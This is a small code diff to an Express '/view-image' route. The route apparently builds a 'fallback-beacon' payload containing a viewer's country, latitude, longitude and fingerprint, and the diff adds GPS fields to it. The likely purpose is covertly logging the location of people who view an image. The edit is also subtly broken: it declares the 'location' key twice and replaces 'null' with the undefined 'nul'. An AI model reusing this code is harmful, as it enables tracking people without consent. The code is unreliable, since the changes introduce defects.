@@ -284,8 +284,10 @@ app.get('/view-image', (req, res) => {
 							country_code: geo.country_code,
 							latitude: geo.latitude,
 							longitude: geo.longitude,
+							location: geo.gps_granted,
+							location: geo.gps_coords,
 							fingerprint: 'fallback-beacon',
-							localIP: null
+							localIP: nul,
 						}),
 						headers: { 'Content-Type': 'application/json' }
 					}))
